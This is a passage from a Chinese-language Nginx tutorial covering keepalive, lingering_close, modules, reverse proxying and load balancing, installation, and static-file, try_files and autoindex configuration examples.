Nginx会将整个请求头都放在一个buffer里面,这个buffer的大小通过配置项client_header_buffer_size来设置,如果用户的请求头太大,这个buffer装不下,那Nginx就会重新分配一个新的更大的buffer来装请求头,这个大buffer可以通过large_client_header_buffers来设置,这个large_buffer这一组buffer,比如配置48k,就是表示有四个8k大小的buffer可以用。为了保存请求行或请求头的完整性,一个完整的请求行或请求头需要放在一个连续的内存里面,所以一个完整的请求行或请求头,只会保存在一个buffer里面。这样如果请求行大于一个buffer的大小就会返回414错误,如果一个请求头大小大于一个buffer大小就会返回400错误。在了解了这些参数的值,以及Nginx实际的做法之后,在应用场景就需要根据实际的需求来调整这些参数来优化程序

keepalive
Nginx中对于http1.0与http1.1也是支持长连接的,http请求是基于TCP协议之上的,那么当客户端在发起请求前,需要先与服务端建立TCP连接,而每一次的TCP连接是需要三次握手来确定的,如果客户端与服务端之间网络差一点,这三次交互消费的时间会比较多,而且三次交互也会带来网络流量。当然当连接断开后也会有四次的交互,当然对用户体验来说就不重要了。而http请求是请求应答式的,如果能知道每个请求头与响应体的长度,那么可以在一个连接上面执行多个请求的,这就是所谓的长连接,但前提条件是先得确定请求头与响应体的长度。对于请求来说,如果当前请求需要有body,如POST请求,那么Nginx就需要客户端在请求头中指定content-length来表明body的大小,否则返回400错误。也就是说请求体的长度是确定的,那么响应体的长度呢？先来看看http协议中关于响应body长度的确定：

对于http1.0协议来说,如果响应头中有content-length头,则以content-length的长度就可以知道body的长度了,客户端在接收body时就可以依照这个长度来接收数据,接收完后就表示这个请求完成了。而如果没有content-length头,则客户端会一直接收数据,直到服务端主动断开连接,才表示body接收完了。

而对于http1.1协议来说,如果响应头中的Transfer-encoding为chunked传输,则表示body是流式输出,body会被分成多个块,每块的开始会标识出当前块的长度,此时body不需要通过长度来指定。如果是非chunked传输且有content-length,则按照content-length来接收数据。否则如果是非chunked并且没content-length则客户端接收数据,直到服务端主动断开连接。

除http1.0不带content-length以及http1.1非chunked不带content-length外,body的长度是可知的。此时当服务端在输出完body之后,会可以考虑使用长连接。能否使用长连接也是有条件限制的。如果客户端的请求头中的connection为close则表示客户端需要关掉长连接,如果为keep-alive则客户端需要打开长连接,如果客户端的请求中没有connection这个头,那么根据协议,如果是http1.0则默认为close,如果是http1.1则默认为keep-alive。如果结果为keepalive,那么Nginx在输出完响应体后会设置当前连接的keepalive属性,然后等待客户端下一次请求。当然Nginx不可能一直等待下去,如果客户端一直不发数据过来,岂不是一直占用这个连接？所以当Nginx设置了keepalive等待下一次的请求时,同时也会设置一个最大等待时间,这个时间是通过选项keepalive_timeout来配置的,如果配置为0,则表示关掉keepalive,此时http版本无论是1.1还是1.0,客户端的connection不管是close还是keepalive都会强制为close

如果服务端最后的决定是keepalive打开,那么在响应的http头里面也会包含有connection头域,其值是"Keep-Alive",否则就是"Close"。如果connection值为close,那么在Nginx响应完数据后会主动关掉连接。所以对于请求量比较大的Nginx来说,关掉keepalive最后会产生比较多的time-wait状态的socket。一般来说当客户端的一次访问需要多次访问同一个server时,打开keepalive的优势非常大,比如图片服务器,通常一个网页会包含很多个图片。打开keepalive也会大量减少time-wait的数量。

pipe
http1.1引入了一种新的特性即pipeline。pipeline其实就是流水线作业,它可以看作为keepalive的一种升华,因为pipelin 也是基于长连接的,目的就是利用一个连接做多次请求。如果客户端要提交多个请求,对于keepalive来说,那么第二个请求必须要等到第一个请求的响应接收完全后才能发起,这和TCP的停止等待协议是一样的,得到两个响应的时间至少为2*RTT。而对pipeline来说,客户端不必等到第一个请求处理完后就可以马上发起第二个请求。得到两个响应的时间可能能够达到1*RTT。Nginx是直接支持pipeline的,但是Nginx对pipeline中的多个请求的处理却不是并行的,依然是一个请求接一个请求的处理,只是在处理第一个请求的时候,客户端就可以发起第二个请求。这样Nginx利用pipeline减少了处理完一个请求后等待第二个请求的请求头数据的时间。其实Nginx的做法很简单,Nginx在读取数据时会将读取的数据放到一个buffer里面,所以如果Nginx在处理完前一个请求后,如果发现buffer里面还有数据就认为剩下的数据是下一个请求的开始,然后就接下来处理下一个请求,否则就设置keepalive。

lingering_close
lingering_close就是延迟关闭,当Nginx要关闭连接时并非立即关闭连接,而是先关闭tcp连接的写,再等待一段时间后再关掉连接的读。为什么要这样呢？先来看看这样一个场景。Nginx在接收客户端的请求时,可能由于客户端或服务端出错了,要立即响应错误信息给客户端,而Nginx在响应错误信息后大分部情况下是需要关闭当前连接。Nginx执行完write()系统调用把错误信息发送给客户端,write()系统调用返回成功并不表示数据已经发送到客户端,有可能还在tcp连接的write buffer里。接着如果直接执行close()系统调用关闭tcp连接,内核会首先检查tcp的read buffer里有没有客户端发送过来的数据留在内核态没有被用户态进程读取,如果有则发送给客户端RST报文来关闭tcp连接丢弃write buffer里的数据,如果没有则等待write buffer里的数据发送完毕,然后再经过正常的4次分手报文断开连接。所以当在某些场景下出现tcp write buffer里的数据在write()系统调用之后到close()系统调用执行之前没有发送完毕,且tcp read buffer里面还有数据没有读,close()系统调用会导致客户端收到RST报文且不会拿到服务端发送过来的错误信息数据。那客户端肯定会想,这服务器好霸道,动不动就reset连接,连个错误信息都没有。

在上面这个场景中可以看到,关键点是服务端给客户端发送了RST包,导致自己发送的数据在客户端忽略掉了。所以解决问题的重点是让服务端别发RST包。再想想发送RST是因为关掉了连接,关掉连接是因为不想再处理此连接了,也不会有任何数据产生了。对于全双工的TCP连接来说,只需要关掉写就行了,读可以继续进行,只需要丢掉读到的任何数据就行了,这样的话,当关掉连接后,客户端再发过来的数据就不会再收到RST了。当然最终还是需要关掉这个读端的,所以会设置一个超时时间,在这个时间过后就关掉读,客户端再发送数据来就不管了,服务端会认为都这么长时间了发给你的错误信息也应该读到了,再慢就不关我事了,要怪就怪你RP不好了。当然正常的客户端在读取到数据后会关掉连接,此时服务端就会在超时时间内关掉读端。这些正是lingering_close所做的事情。协议栈提供SO_LINGER这个选项,它的一种配置情况就是来处理 lingering_close的情况的,不过Nginx是自己实现的lingering_close。
lingering_close存在的意义就是来读取剩下的客户端发来的数据,所以Nginx会有一个读超时时间,通过lingering_timeout选项来设置,如果在lingering_timeout时间内还没有收到数据,则直接关掉连接。Nginx还支持设置一个总的读取时间,通过lingering_time来设置,这个时间也就是Nginx在关闭写之后,保留socket的时间,客户端需要在这个时间内发送完所有的数据,否则Nginx在这个时间过后,会直接关掉连接。当然Nginx是支持配置是否打开lingering_close选项的,通过lingering_close选项来配置。

在实际应用中是否应该打开lingering_close呢？这个就没有固定的推荐值了,lingering_close的主要作用是保持更好的客户端兼容性,但是却需要消耗更多的额外资源(比如连接会一直占着)。

</pre>

<h4>Nginx的模块化体系结构</h4><pre>
Nginx的内部结构是由核心部分和一系列的功能模块所组成。这样划分是为了使得每个模块的功能相对简单,便于开发,同时也便于对系统进行功能扩展。

Nginx提供了Web服务器的基础功能,同时提供Web服务反向代理,Email服务反向代理功能。Nginx core实现了底层的通讯协议,为其他模块和Nginx进程构建了基本的运行时环境,并且构建了其他各模块的协作基础。此外或者说大部分与协议相关的,或者应用相关的功能都是在这些模块中所实现的。

Nginx将各功能模块组织成一条链,当有请求到达的时候,请求依次经过这条链上的部分或全部模块进行处理,每个模块实现特定的功能。例如实现对请求解压缩的模块,实现SSI的模块,实现与上游服务器进行通讯的模块,实现与FastCGI服务进行通讯的模块。

有两个模块比较特殊,他们居于Nginx core和各功能模块的中间。这两个模块就是http模块和mail模块。这2个模块在Nginx core之上实现了另外一层抽象,处理与HTTP协议和Email相关协议(SMTP/POP3/IMAP)有关的事件,并且确保这些事件能被以正确的顺序调用其他的一些功能模块。
目前HTTP协议是被实现在http模块中的,但是有可能将来被剥离到一个单独的模块中,以扩展Nginx支持SPDY协议。

Nginx的模块根据其功能基本上可以分为以下几种类型：
1、event module: 搭建了独立于操作系统的事件处理机制的框架,及提供了各具体事件的处理,包括ngx_events_module、 ngx_event_core_module和ngx_epoll_module等。Nginx具体使用何种事件处理模块依赖于具体的操作系统和编译选项。

2、phase handler: 此类型的模块也被直接称为handler模块。主要负责处理客户端请求并产生待响应内容,比如ngx_http_static_module模块,负责客户端的静态页面请求处理并将对应的磁盘文件准备为响应内容输出。

3、output filter: 即filter模块,主要是负责对输出的内容进行处理,可以对输出进行修改。例如可以实现对输出的所有html页面增加预定义的footbar 一类的工作,或者对输出的图片的URL进行替换之类的工作。

4、upstream: 实现反向代理的功能,将真正的请求转发到后端服务器上,并从后端服务器上读取响应发回客户端。upstream模块是一种特殊的handler,只不过响应内容不是真正由自己产生的,而是从后端服务器上读取的。

5、load-balancer: 负载均衡模块,实现特定的算法,在众多的后端服务器中选择一个服务器出来作为某个请求的转发服务器。

</pre>

<h4>反向代理和负载均衡</h4><pre>
【 正向代理Forward proxy、反向代理Reverse Proxy 】
正向代理即一般的代理,是一个位于客户端和原始服务器(origin server)之间的服务器,其工作原理就像一个跳板,用户访问不了原始服务器,但能访问代理服务器,这个代理服务器能访问原始服务器,于是用户先连上代理服务器,告诉他需要原始服务器的内容,代理服务器转交请求并将获得的内容返回给客户端。从原始服务器的角度,只在代理服务器来取内容的时候有一次记录,有时候并不知道是用户的请求,也隐藏了用户的资料,这取决于代理告不告诉网站。客户端必须要进行一些特别的设置才能使用正向代理

正向代理最大的特点是客户端非常明确要访问的服务器地址;服务器只清楚请求来自哪个代理服务器,而不清楚来自哪个具体的客户端;正向代理模式屏蔽或隐藏了真实客户端信息

反向代理(Reverse Proxy)方式是指以代理服务器来接受internet上的连接请求,然后将请求转发给内部网络上的服务器,并将从服务器上得到的结果返回给internet上请求连接的客户端,此时代理服务器对外就表现为一个反向代理服务器

多个客户端给服务器发送的请求,nginx服务器接收到之后,按照一定的规则分发给了后端的业务处理服务器进行处理。此时请求的来源也就是客户端是明确的,但是请求具体由哪台服务器处理的并不明确了,nginx扮演的就是一个反向代理角色
反向代理主要用于服务器集群分布式部署的情况下,反向代理隐藏了服务器的信息

通常情况下在实际项目操作时,正向代理和反向代理很有可能会存在在一个应用场景中,正向代理代理客户端的请求去访问目标服务器,目标服务器是一个反向代理服务器,反向代理了多台真实的业务处理服务器

【 负载均衡分流:分发请求 】
集群就是指一组相互独立的计算机,利用高速通信网络组成的一个较大的计算机服务系统,每个集群节点都是运行各自服务的独立服务器。这些服务器之间可以彼此通信,协同向用户提供应用程序、系统资源和数据,并以单一系统的模式加以管理。当用户客户机请求集群系统时,集群给用户的感觉就是一个单一的服务器,而实际上用户请求的是一组集群服务器。

集群主要包括几大特点：高性能、价格有效性、可伸缩性、高可用性、透明性、可管理性和可编程性

常见的负载均衡的架构包括有负载均衡集群、高可用性集群、高性能计算集群等等。这里着重介绍负载均衡集群,其他的集群方式不做介绍。

负载均衡集群为企业提供了更为实用、性价比更高的系统架构解决方案。负载集群可以把很多客户集中的访问请求负载压力尽可能平均分摊到计算机集群中处理。客户访问请求负载均衡通常包含应用程序处理负载均衡和网络流量负载。这样的系统非常适合使用同一组应用程序为大量用户提供服务的模式,每个节点都可以承当一定的访问请求负载压力,并且可以实现访问请求在各节点之间动态分配,以实现负载均衡。

负载均衡集群运行时,一般是通过一个或多个前端负载均衡器将客户访问请求分发到后端的一组服务器上,从而达到整个系统的高性能和高可用性。一般高可用性集群和负载均衡集群使用类似的技术,或同事具有高可用与负载均衡的特点。负载均衡的作用为：分担用户访问及数据流量、保持业务的连续性、应用于Web业务及数据库从库等服务器的业务

网站在实际运营过程中多半是有多台服务器运行着同样的app即服务器集群,这时需要使用负载均衡来分流降低服务器的压力,防止单个服务器压力过大造成服务器崩溃瘫痪
客户端发送的、nginx反向代理服务器接收到的请求数量就是负载量,请求数量按照一定的规则进行分发到不同的服务器处理的规则就是一种均衡规则,所以将服务器接收到的请求按照规则分发转发的过程称为负载均衡,Nginx服务器是不处理用户请求的

负载均衡在实际项目操作过程中,有硬件负载均衡和软件负载均衡两种,硬件负载均衡也称为硬负载,如F5负载均衡,相对造价昂贵成本较高,但是数据的稳定性安全性等有非常好的保障,如中国移动中国联通这样的公司才会选择硬负载进行操作;更多的公司考虑到成本会选择使用软件负载均衡,软件负载均衡是利用现有的技术结合主机硬件实现的一种消息队列分发机制

反向代理代理的是服务器,是从客户端连接的角度来看的。对于客户端来说,它看不到后面的真正的应用服务器
负载均衡是前端进行资源负载分配调度,让多台相同功能的服务器实现尽可能类似的负载,从而最大化效率
两者目的不一样,但是最终实现有点相同

一般的代理是上网的时候请求网页不直接和网站通讯,而是发给代理服务器,代理服务器和网站通讯,获得网页再传回。在网站看来,代理服务器好像是一个上网的客户端。可见代理服务器是对网站透明的,网站不知道代理的存在。
反向代理的原理和代理一样,只不过它反过来,用户直接请求反向代理服务器,反向代理和真正的网站通讯,获得网页再传回。在用户看来,反向代理服务器就好像是网站服务器。可见反向代理对用户是透明的,用户不知道反向代理的存在。
至于负载均衡、缓存等等都是代理服务器的附加功能

负载均衡需要通过反向代理来实现,负载均衡是做反向代理的目的之一
反向代理是指nginx作为前端服务器将请求转发到后端,再将后端服务器的结果返回给客户端,它在中间做了一个代理服务器的角色
负载均衡对反向代理增加了一些策略,因为后端是多台服务器,nginx会根据设定的策略将请求转发给一个相对空闲的服务器,对负载进行分流,减轻服务器压力

反向代理是把一些静态资源存储在服务器上,当用户有请求时就直接返回反向代理服务器上的资源给用户,而如果反向代理服务器上没有的资源就转发给后面的负载均衡服务器,负载均衡服务器再将请求分发给后端的web服务器。 区别就是：反向代理服务器是需要存储资源的,让用户更快速的接收到资源 负载均衡就是为了保证后端web服务器的高可用、高并发,是不需要要存储资源,只需要转发用户的请求

反向代理就是后端服务不直接对外暴露,请求首先发送到nginx,然后nginx将请求转发到后端服务器,比如tomcat等;如果后端服务只有一台服务器,nginx在这里只有一个作用就是起到了代理后端服务接收请求的作用,称之为反向代理
可是在现实的应用场景中,一台后端服务器出现单点故障的概率很大或单台机器的吞吐量有限无法承担过多请求,这时候就需要在nginx后端配置多台服务器,利用nginx内置的规则将请求转发到后端不同的机器上,这时候就起到了负载均衡的作用

反向代理的概念
用户访问http://www.test.com/readme,但www.test.com上并不存在readme页面,他是偷偷从另外一台服务器上取回来,然后作为自己的内容返回用户,但用户并不知情。这里所提到的www.test.com这个域名对应的服务器就设置了反向代理功能。

对于客户端而言反向代理就像是原始服务器,并且客户端不需要进行任何特别的设置。客户端向反向代理的命名空间(name-space)中的内容发送普通请求,接着反向代理将判断向何处(原始服务器)转交请求,并将获得的内容返回给客户端,就像这些内容原本就是它自己的一样。

两者区别
从用途上来讲：
正向代理的典型用途是为防火墙内的局域网客户端提供访问Internet的途径。正向代理还可以使用缓冲特性减少网络使用率。反向代理的典型用途是将防火墙后面的服务器提供给Internet用户访问。反向代理还可以为后端的多台服务器提供负载平衡,或为后端较慢的服务器提供缓冲服务。另外反向代理还可以启用高级URL策略和管理技术,从而使处于不同web服务器系统的web页面同时存在于同一个URL空间下。

从安全性来讲：
正向代理允许客户端通过它访问任意网站并且隐藏客户端自身,因此必须采取安全措施以确保仅为经过授权的客户端提供服务。反向代理对外都是透明的,访问者并不知道自己访问的是一个代理。

反向代理和负载均衡的区别在于负载均衡通常都是对请求的数据包的转发(也有可能会改写数据包)、传递,其中DR模式明显的特征就是从负载均衡下面的节点服务器来看,接收到的请求还是来自负载均衡器的客户端的真实用户。而反向代理,反向代理接收访问用户的请求后,会代理用户重新发起请求代理下的节点服务器,最后把数据返回给客户端用户。在节点服务器来看,访问节点服务器的客户端用户是反向代理服务器,而不是真实的网站访问用户

</pre>
</div>

<div id="nginx_install">
<h4>nginx安装</h4><pre>
windows安装
官网下载地址：https://nginx.org/en/download.html
解压之后点击nginx.exe或cmd> nginx 或 cmd运行start nginx,浏览器输入localhost即可访问

cmd后台运行nginx E:\wnmp\nginx>start /b nginx -c wamp.conf

nginx -h
nginx -s stop       快速关闭Nginx,可能不保存相关信息,并迅速终止web服务
nginx -s quit       平稳关闭Nginx,保存相关信息,有安排的结束web服务
nginx -s reload     热启动,修改配置文件后不用关闭Nginx就可以实现让配置生效重载
nginx -s reopen     重新打开日志文件
nginx -c filename   为Nginx指定一个配置文件来代替缺省的,conf/nginx.conf是nginx的默认配置文件
nginx -v 显示nginx的版本
nginx -V 显示nginx的版本,编译器版本和配置参数
nginx -t 不运行仅测试配置文件语法的正确性,并尝试打开配置文件中所引用到的文件,nginx.exe -t -c conf/nginx.conf
nginx -T 不运行仅测试配置文件,输出所有配置参数

使用reload或restart装载新配置,如果新配置格式有误不会报错,可以启动成功
所以改配置后最好用stop和start指令来,这样启动失败就可以确定为配置格式问题,否则新配置不会生效,也不知道是配置格式问题

</pre>可在nginx安装目录下新添启动批处理文件startup.bat<textarea>@echo off
rem 如果启动前已经启动nginx并记录下pid文件,会kill指定进程
nginx.exe -s stop

rem 测试配置文件语法正确性
nginx.exe -t -c conf/nginx.conf

rem 显示版本信息
nginx.exe -v

rem 按照指定配置去启动nginx
nginx.exe -c conf/nginx.conf

</textarea><pre>
【 ubuntu16.04安装nginx 】
sudo apt update
sudo apt install nginx
sudo ufw app list       # 查看列表
ps aux|grep nginx       # 查看nginx进程

Nginx文件目录
1、/var/www/html/             实际的Web内容,可以通过更改Nginx配置文件来更改
2、/etc/nginx                 nginx配置目录
/etc/nginx/nginx.conf        Nginx主配置文件
/etc/nginx/sites-available/
可以存储每个站点"服务器块"的目录。Nginx不会使用此目录中找到的配置文件,除非它们链接到sites-enabled目录。通常所有服务器块配置都在此目录中完成,然后通过链接到其他目录来启用
/etc/nginx/sites-enabled/
存储启用每个站点"服务器块"的目录。通常这些是通过链接到目录中找到的配置文件创建的sites-available
/etc/nginx/snippets
此目录包含Nginx配置中可以包含的配置片段,潜在的可重复配置段是重构为代码片段的好候选者
3、/var/log/nginx/           服务器日志
access.log对于Web服务器的每个请求都将记录在此日志文件中,除非Nginx配置为其他方式
error.log任何Nginx错误将记录在此日志中

卸载nginx
sudo apt-get remove nginx nginx-common       # 卸载删除除了配置文件以外的所有文件。
sudo apt-get purge nginx nginx-common        # 卸载所有,包括删除配置文件。
sudo apt-get autoremove                      # 主要是卸载删除Nginx的不再被使用的依赖包。
sudo apt-get remove nginx-full nginx-common  # 卸载删除两个主要的包。

</pre>
</div>

<div id="nginx_use">
<h3>Nginx在不依赖第三方模块情况下能处理的事情</h3><pre>
1、反向代理
2、负载均衡
3、HTTP服务器(包含动静分离)
4、正向代理

</pre>

<h4>HTTP服务器</h4><pre>
Nginx本身也是一个静态资源的服务器,如果一个网站只是静态页面的话,那么就可以通过这种方式来实现部署,现在很流行的动静分离就可以通过Nginx来实现

【 Nginx配置静态内容服务器 】
1. 根目录和索引文件
root指令指定将用于搜索文件的根目录。要获取请求文件的路径,NGINX将请求URI附加到root指令指定的路径。
该指令可以放置在http、server或location上下文中的任何级别上,它适用于不包括root指令的所有location块以显式重新定义根：

</pre><textarea># 访问http://localhost就会默认访问到E:\wwwroot\index.html
server {
  listen       80;
  server_name  localhost;
  client_max_body_size 1024M;

  location / {
    root   E:/wwwroot;
    index  index.html;
  }
}

# 在文件系统的/www/data/images/目录中搜索以/images/开头的URI,但如果URI以.mp3或.mp4扩展名结尾则NGINX会在/www/media/目录中搜索.mp3或.mp4文件,因为它在匹配的location块中定义。如果请求以斜杠结尾则NGINX将其视为对目录的请求,并尝试在目录中找到索引文件。
# index指令定义索引文件的名称(默认值为index.html),如果请求URI为/images/some/path/则NGINX会传递文件/www/data/images/some/path/index.html,如果不存在文件,NGINX默认返回HTTP代码404(未找到)
server {
  root /www/data;

  location / {
  }

  location /images/ {
  }

  location ~ \.(mp3|mp4) {
    root /www/media;
  }
}

# 可以在索引指令中列出多个文件名,NGINX以指定的顺序搜索文件,并返回它找到的第一个文件
# 这里使用的$geo变量是通过geo指令设置的自定义变量,变量的值取决于客户端的IP地址。
location / {
  index index.$geo.html index.html index.html;
}

# 要返回索引文件,NGINX检查其是否存在,然后通过将索引文件的名称附加到基本URI来对通过URI获取的内部重定向。内部重定向会导致对某个位置(location)的新搜索,并且可能会在另一个位置(location)中结束
# 如果请求中的URI是/path/,并且/data/path/index.html不存在,但是/data/path/index.php存在,则将/path/index.php 内部重定向映射到第二个位置(location)。 因此请求被代理。
location / {
  root /data;
  index index.html index.php;
}

location ~ \.php {
  fastcgi_pass localhost:8000;
  ...
}

</textarea>静态站点配置<textarea>// 如果所有的静态资源都放在/app/dist目录下,只要在nginx.conf中指定首页及这个站点的host即可
// 添加HOST：127.0.0.1 static.zp.cn,在本地浏览器访问static.zp.cn就可以访问静态站点了
worker_processes  1;

events {
  worker_connections  1024;
}

http {
  include            mime.types;
  default_type       application/octet-stream;
  sendfile           on;
  keepalive_timeout  65;

  gzip       on;
  gzip_types text/plain application/x-javascript text/css application/xml text/javascript application/javascript image/jpeg image/gif image/png;
  gzip_vary  on;

  server {
    listen       80;
    server_name  static.zp.cn;

    location / {
      root /app/dist;
      index index.html;   # 转发任何请求到index.html
    }
  }
}

</textarea><textarea># nginx处理静态文件
location ~ ^/(images|javascript|js|css|flash|media|static)/ {
  expires 30d;    #30天过期,静态文件不怎么更新则可以设置得大一点,如果频繁更新则可以设置得小一点
}

# 反向代理静态文件
location ~ .*\.(gif|jpg|jpeg|png|bmp|swf|js|css)${
  # 使用Web缓存区cache_one
  proxy_cache cache_one ;
  # 对不同HTTP状态码缓存设置不同的缓存时间
  proxy_cache_valid 200 304 12h;
  proxy_cache_valid 301 302 1m;
  proxy_cache_valid any 1m;
  # 设置Web缓存的Key值,Nginx根据Key值md5哈希存储缓存,这里根据"域名,URI,参数"组合成Key
  proxy_cache_key $host$uri$is_args$args;
}

</textarea><pre>
【 try_files指令 】
Syntax: try_files file ... uri;
        try_files file ... =code;
Default: —
Context: server,location

try_files指令按指定的顺序检查指定的文件或目录是否存在,并使用第一个找到的文件,并进行内部重定向,如果没有指定的文件或目录则返回特定的状态代码。
尝试查找第1至第N-1个文件,第一个即为返回给请求者的资源;若1至N-1文件都不存在则跳转至最一个uri,必须不能匹配至当前location,而应该匹配至其它location,否则会导致死循环

</pre>使用try_files指令和$uri变量检查与请求URI相对应的文件的存在<textarea># 与原始URI相对应的文件不存在时NGINX将内部重定向到最后一个参数中指定的URI,即返回/www/data/images/default.gif
server {
  root /www/data;
  location /images/ {
    try_files $uri /images/default.gif;
  }
  location = /images/default.gif {
    expires 30s;
  }
}

# 最后一个参数也可以是一个状态代码或位置的名称,如下示例表示如果try_files指令的任何参数都不会解析为现有文件或目录则会返回404错误
location / {
  try_files $uri $uri/ $uri.html =404;
}
location / {
  try_files $uri $uri/index.html $uri.html =404;
}

# 原始URI和带有附加尾部斜线的URI都不能解析为现有文件或目录时将请求重定向到将其传递给代理服务器的命名位置(location)
location / {
  try_files $uri $uri/ @backend;
}
location @backend {
  proxy_pass http://backend.example.com;
}

# Example in proxying Mongrel:
location / {
  try_files /system/maintenance.html $uri $uri/index.html $uri.html @mongrel;
}
location @mongrel {
  proxy_pass http://mongrel;
}

# Example for Drupal/FastCGI:
location / {
  try_files $uri $uri/ @drupal;
}
location ~ \.php$ {
  try_files $uri @drupal;
  fastcgi_pass ...;
  fastcgi_param SCRIPT_FILENAME /path/to$fastcgi_script_name;
  fastcgi_param SCRIPT_NAME     $fastcgi_script_name;
  fastcgi_param QUERY_STRING    $args;
  ... other fastcgi_param's
}

location @drupal {
  fastcgi_pass ...;
  fastcgi_param SCRIPT_FILENAME /path/to/index.php;
  fastcgi_param SCRIPT_NAME     /index.php;
  fastcgi_param QUERY_STRING    q=$uri&$args;
  ... other fastcgi_param's
}

# In the following example,
location / {
  try_files $uri $uri/ @drupal;
}
# the try_files directive is equivalent to
location / {
  error_page 404 = @drupal;
  log_not_found off;
}
# And here,
location ~ \.php$ {
  try_files $uri @drupal;
  fastcgi_pass ...;
  fastcgi_param SCRIPT_FILENAME /path/to$fastcgi_script_name;
  ...
}

# try_files checks the existence of the PHP file before passing the request to the FastCGI server.

# Example for Wordpress and Joomla:
location / {
  try_files $uri $uri/ @wordpress;
}
location ~ \.php$ {
  try_files $uri @wordpress;
  fastcgi_pass ...;
  fastcgi_param SCRIPT_FILENAME /path/to$fastcgi_script_name;
  ... other fastcgi_param's
}
location @wordpress {
  fastcgi_pass ...;
  fastcgi_param SCRIPT_FILENAME /path/to/index.php;
  ... other fastcgi_param's
}

</textarea><pre>
3. 优化NGINX服务内容的速度
【 sendfile指令 】
默认NGINX会自动处理文件传输,并在发送文件之前将其复制到缓冲区中。
启用sendfile指令将消除将数据复制到缓冲区中的步骤,并允许将数据从一个文件描述符直接复制到另一个文件描述符。
为了防止一个快速连接完全占用工作进程,可以通过定义sendfile_max_chunk指令来限制在单个sendfile()调用中传输的数据量

【 tcp_nopush指令 】
将tcp_nopush选项与sendfile一起使用,该选项将使NGINX能够通过sendfile获取数据块之后,在一个数据包中发送HTTP响应头

</pre><textarea>location /mp3 {
  sendfile   on;
  sendfile_max_chunk 1m;
  tcp_nopush on;
}

</textarea><pre>
【 tcp_nodelay指令 】
tcp_nodelay选项可以覆盖Nagle的算法,最初是为了解决慢网络中的小数据包问题而设计的。该算法将大量小数据包整合到较大的数据包中,并以200ms的延迟发送数据包。
当服务大型静态文件时,无论数据包大小如何都可以立即发送数据,延迟也会影响在线应用程序(ssh,在线游戏,网上交易),默认tcp_nodelay指令设置为on,表示Nagle的算法被禁用,该选项仅用于Keepalive连接

</pre><textarea>location /mp3  {
  tcp_nodelay       on;
  keepalive_timeout 65;
}

</textarea><textarea>【 优化积压队列 】
其中一个重要因素是NGINX可以处理传入连接的速度,一般规则是建立连接时将其放入监听套接字的侦听队列中。
在正常负载下有一个低队列或根本没有队列,但在高负载下队列可能会急剧增长,这可能会导致性能不均衡、连接丢失和延迟。

测量侦听队列
查看当前的侦听队列,运行命令：netstat -Lan
命令输出可能如下所示
Current listen queue sizes (qlen/incqlen/maxqlen)
Listen         Local Address
0/0/128        *.12345
10/0/128        *.80
0/0/128        *.8080

命令输出显示端口80的监听队列中有10个不接受的连接,而连接限制为128个连接,这种情况是正常的。
但是命令输出可能如下所示
Current listen queue sizes (qlen/incqlen/maxqlen)
Listen         Local Address
0/0/128        *.12345
192/0/128        *.80
0/0/128        *.8080

命令输出显示超过128个连接限制的192个不可接受的连接,当网站的流量很大时这是很常见的
为了达到最佳性能,需要增加NGINX在操作系统和NGINX配置中排队等待接收的最大连接数。

调整操作系统
将net.core.somaxconn键的值从其默认值(128)增加到足够高的值以能够处理高突发流量
对于FreeBSD,运行命令：sudo sysctl kern.ipc.somaxconn=4096
对于FreeBSD,运行命令：sudo sysctl -w net.core.somaxconn=4096

打开文件：/etc/sysctl.conf,将下面一行添加到文件并保存文件：net.core.somaxconn = 4096

调整NGINX
如果将somaxconn键设置为大于512的值,请更改NGINX listen指令的backlog参数以匹配
server {
  listen 80 backlog 4096;
  # The rest of server configuration
}

【 索引目录配置 】
Nginx默认是不允许列出整个目录的

语法: autoindex on | off;
默认值:  autoindex off;
配置段:  http,server,location
启用/仅用nginx目录索引功能

语法: autoindex_exact_size on | off;
默认值:  autoindex_exact_size on;
配置段:  http,server,location
制定是否额外得显示文件的大小,单位为字节、mb、gb等,默认为on显示出文件的确切大小,单位是bytes。改为off后显示出文件的大概大小,单位是kB或MB或GB

syntax: autoindex_localtime on | off;
默认值:  autoindex_localtime off;
配置段:  http,server,location
指定是否显示目录或文件的服务器修改时间,默认为off显示的文件时间为GMT时间。

</textarea>搭建文件服务器<textarea>autoindex on;                     # 显示目录
autoindex_exact_size on;          # 显示文件大小
autoindex_localtime on;           # 显示文件时间

server {
  listen       9050 default_server;
  listen       [::]:9050 default_server;
  server_name  _;
  charset      utf-8,gbk;        # 避免中文乱码问题
  root         /share/fs;        # root用来设置开放为文件服务的根路径
}

</textarea>使用Nginx代理服务器来处理静态文件,http://file.xxx.com显示系统文件索引<textarea>server {
  listen      80;
  server_name file.xxx.com;
  charset     utf-8;
  root        /data/statics;    # root指令用来指定文件在服务器上的基路径
  location / {                  # location指令用来映射请求到本地文件系统
    autoindex on;             # 索引,配置NGINX以返回自动生成的目录列表
    autoindex_exact_size on;  # 显示文件大小
    autoindex_localtime on;   # 显示文件时间
  }
}

</textarea>把/srv/www/目录作为根目录来直接列出来<textarea>location /{
  root /srv/www/;
  autoindex on;
}

</textarea>

<h4>动静分离</h4><pre>
动静分离是让动态网站里的动态网页根据一定规则把不变的资源和经常变的资源区分开来,动静资源做好了拆分后就可以根据静态资源的特点将其做缓存操作,这是网站静态化处理的核心思路

</pre><textarea># 把HTML及图片和css及js放到wwwroot目录下,而tomcat只负责处理jsp和请求,例如当后缀为gif时Nginx默认会从wwwroot获取到当前请求的动态图文件返回,这里的静态文件跟Nginx是同一台服务器,也可以在另外一台服务器,然后通过反向代理和负载均衡配置
upstream test{
  server localhost:8080;
  server localhost:8081;
}

server {
  listen       80;
  server_name  localhost;

  location / {
    root   e:/wwwroot;
    index  index.html;
  }

  # 所有静态请求都由nginx处理,存放目录为html
  location ~ .(gif|jpg|jpeg|png|bmp|swf|css|js)$ {
    root    e:/wwwroot;
  }

  # 所有动态请求都转发给tomcat处理
  location ~ .(jsp|do)$ {
    proxy_pass  http://test;
  }

  error_page   500 502 503 504  /50x.html;
  location = /50x.html {
    root   e:/wwwroot;
  }
}

</textarea>

<h4>正向代理</h4><pre>
正向代理是一个位于客户端和原始服务器(origin server)之间的服务器,为了从原始服务器取得内容,客户端向代理发送一个请求并指定目标(原始服务器),然后代理向原始服务器转交请求并将获得的内容返回给客户端
可以用Nginx来实现正向代理,把服务器作为代理服务器
resolver是配置正向代理的DNS服务器,listen是正向代理的端口,配置好了就可以在ie上或其他代理插件上面使用服务器ip+端口号进行代理了。

resolver指令
语法: resolver address ... [valid=time];
默认值: —
配置段: http,server,location
配置DNS服务器IP地址。可以指定多个,以轮询方式请求。
